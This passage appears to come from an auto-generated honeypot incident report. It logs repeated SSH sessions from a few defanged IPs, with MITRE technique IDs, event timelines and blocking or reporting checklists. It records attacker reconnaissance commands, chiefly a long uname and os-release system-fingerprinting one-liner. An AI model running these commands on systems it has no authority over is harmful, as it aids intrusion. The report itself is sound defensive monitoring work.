| `2026-07-06 05:06:26` | `cowrie.session.params` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.success` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:26` | `cowrie.command.input` |
| `2026-07-06 05:06:27` | `cowrie.log.closed` |
| `2026-07-06 05:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6853da5d786a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:07 |
| **Last Seen** | 2026-07-06 05:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:07:07` | `cowrie.session.connect` |
| `2026-07-06 05:07:08` | `cowrie.client.version` |
| `2026-07-06 05:07:08` | `cowrie.client.kex` |
| `2026-07-06 05:07:12` | `cowrie.login.success` |
| `2026-07-06 05:07:14` | `cowrie.session.params` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.success` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:14` | `cowrie.command.input` |
| `2026-07-06 05:07:15` | `cowrie.log.closed` |
| `2026-07-06 05:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9996b23c4d7c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:07 |
| **Last Seen** | 2026-07-06 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:07:20` | `cowrie.session.connect` |
| `2026-07-06 05:07:20` | `cowrie.client.version` |
| `2026-07-06 05:07:20` | `cowrie.client.kex` |
| `2026-07-06 05:07:20` | `cowrie.login.success` |
| `2026-07-06 05:07:21` | `cowrie.session.params` |
| `2026-07-06 05:07:21` | `cowrie.command.input` |
| `2026-07-06 05:07:21` | `cowrie.log.closed` |
| `2026-07-06 05:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e15edfc375e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:07 |
| **Last Seen** | 2026-07-06 05:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:07:56` | `cowrie.session.connect` |
| `2026-07-06 05:07:57` | `cowrie.client.version` |
| `2026-07-06 05:07:57` | `cowrie.client.kex` |
| `2026-07-06 05:08:00` | `cowrie.login.success` |
| `2026-07-06 05:08:02` | `cowrie.session.params` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.success` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.command.input` |
| `2026-07-06 05:08:02` | `cowrie.log.closed` |
| `2026-07-06 05:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0092d64e4e1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:08 |
| **Last Seen** | 2026-07-06 05:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:08:44` | `cowrie.session.connect` |
| `2026-07-06 05:08:45` | `cowrie.client.version` |
| `2026-07-06 05:08:45` | `cowrie.client.kex` |
| `2026-07-06 05:08:48` | `cowrie.login.success` |
| `2026-07-06 05:08:50` | `cowrie.session.params` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.success` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.command.input` |
| `2026-07-06 05:08:50` | `cowrie.log.closed` |
| `2026-07-06 05:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f470a29c4740

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:08 |
| **Last Seen** | 2026-07-06 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:08:52` | `cowrie.session.connect` |
| `2026-07-06 05:08:52` | `cowrie.client.version` |
| `2026-07-06 05:08:52` | `cowrie.client.kex` |
| `2026-07-06 05:08:52` | `cowrie.login.success` |
| `2026-07-06 05:08:53` | `cowrie.session.params` |
| `2026-07-06 05:08:53` | `cowrie.command.input` |
| `2026-07-06 05:08:53` | `cowrie.log.closed` |
| `2026-07-06 05:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e77a17a2212d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:09 |
| **Last Seen** | 2026-07-06 05:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:09:31` | `cowrie.session.connect` |
| `2026-07-06 05:09:32` | `cowrie.client.version` |
| `2026-07-06 05:09:32` | `cowrie.client.kex` |
| `2026-07-06 05:09:35` | `cowrie.login.success` |
| `2026-07-06 05:09:37` | `cowrie.session.params` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.success` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:37` | `cowrie.command.input` |
| `2026-07-06 05:09:38` | `cowrie.log.closed` |
| `2026-07-06 05:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e91501364fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:10 |
| **Last Seen** | 2026-07-06 05:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:10:19` | `cowrie.session.connect` |
| `2026-07-06 05:10:20` | `cowrie.client.version` |
| `2026-07-06 05:10:20` | `cowrie.client.kex` |
| `2026-07-06 05:10:23` | `cowrie.login.success` |
| `2026-07-06 05:10:25` | `cowrie.session.params` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.success` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:25` | `cowrie.command.input` |
| `2026-07-06 05:10:26` | `cowrie.log.closed` |
| `2026-07-06 05:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-700c01d8d618

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:10 |
| **Last Seen** | 2026-07-06 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:10:24` | `cowrie.session.connect` |
| `2026-07-06 05:10:24` | `cowrie.client.version` |
| `2026-07-06 05:10:24` | `cowrie.client.kex` |
| `2026-07-06 05:10:25` | `cowrie.login.success` |
| `2026-07-06 05:10:26` | `cowrie.session.params` |
| `2026-07-06 05:10:26` | `cowrie.command.input` |
| `2026-07-06 05:10:26` | `cowrie.log.closed` |
| `2026-07-06 05:10:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3aafaac0699

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:11 |
| **Last Seen** | 2026-07-06 05:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:11:07` | `cowrie.session.connect` |
| `2026-07-06 05:11:08` | `cowrie.client.version` |
| `2026-07-06 05:11:08` | `cowrie.client.kex` |
| `2026-07-06 05:11:12` | `cowrie.login.success` |
| `2026-07-06 05:11:14` | `cowrie.session.params` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.success` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:14` | `cowrie.command.input` |
| `2026-07-06 05:11:15` | `cowrie.log.closed` |
| `2026-07-06 05:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2c44ecbfd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:11 |
| **Last Seen** | 2026-07-06 05:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:11:54` | `cowrie.session.connect` |
| `2026-07-06 05:11:55` | `cowrie.client.version` |
| `2026-07-06 05:11:55` | `cowrie.client.kex` |
| `2026-07-06 05:11:59` | `cowrie.login.success` |
| `2026-07-06 05:12:01` | `cowrie.session.params` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.success` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:01` | `cowrie.command.input` |
| `2026-07-06 05:12:02` | `cowrie.log.closed` |
| `2026-07-06 05:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d5981bf2268

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:12 |
| **Last Seen** | 2026-07-06 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:12:01` | `cowrie.session.connect` |
| `2026-07-06 05:12:01` | `cowrie.client.version` |
| `2026-07-06 05:12:01` | `cowrie.client.kex` |
| `2026-07-06 05:12:02` | `cowrie.login.success` |
| `2026-07-06 05:12:02` | `cowrie.session.params` |
| `2026-07-06 05:12:02` | `cowrie.command.input` |
| `2026-07-06 05:12:02` | `cowrie.log.closed` |
| `2026-07-06 05:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-591166c6da2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:12 |
| **Last Seen** | 2026-07-06 05:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:12:42` | `cowrie.session.connect` |
| `2026-07-06 05:12:43` | `cowrie.client.version` |
| `2026-07-06 05:12:43` | `cowrie.client.kex` |
| `2026-07-06 05:12:47` | `cowrie.login.success` |
| `2026-07-06 05:12:49` | `cowrie.session.params` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.success` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.command.input` |
| `2026-07-06 05:12:49` | `cowrie.log.closed` |
| `2026-07-06 05:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32975a10de5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 05:13 |
| **Last Seen** | 2026-07-06 05:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:13:30` | `cowrie.session.connect` |
| `2026-07-06 05:13:30` | `cowrie.client.version` |
| `2026-07-06 05:13:30` | `cowrie.client.kex` |
| `2026-07-06 05:13:34` | `cowrie.login.success` |
| `2026-07-06 05:13:36` | `cowrie.session.params` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.success` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:36` | `cowrie.command.input` |
| `2026-07-06 05:13:37` | `cowrie.log.closed` |
| `2026-07-06 05:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-564310fe5271

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 05:13 |
| **Last Seen** | 2026-07-06 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:13:37` | `cowrie.session.connect` |
| `2026-07-06 05:13:37` | `cowrie.client.version` |
| `2026-07-06 05:13:37` | `cowrie.client.kex` |
| `2026-07-06 05:13:37` | `cowrie.login.success` |
| `2026-07-06 05:13:38` | `cowrie.session.params` |
| `2026-07-06 05:13:38` | `cowrie.command.input` |
| `2026-07-06 05:13:38` | `cowrie.log.closed` |
| `2026-07-06 05:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b321ca2c98

| Field | Detail |
|---|---|
| **Source IP** | `130.61.23[.]223` |
| **First Seen** | 2026-07-06 05:14 |
| **Last Seen** | 2026-07-06 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 05:14:09` | `cowrie.session.connect` |
| `2026-07-06 05:14:09` | `cowrie.login.success` |
| `2026-07-06 05:14:10` | `cowrie.session.params` |
| `2026-07-06 05:14:10` | `cowrie.command.input` |
| `2026-07-06 05:14:10` | `cowrie.command.failed` |
| `2026-07-06 05:14:10` | `cowrie.command.input` |
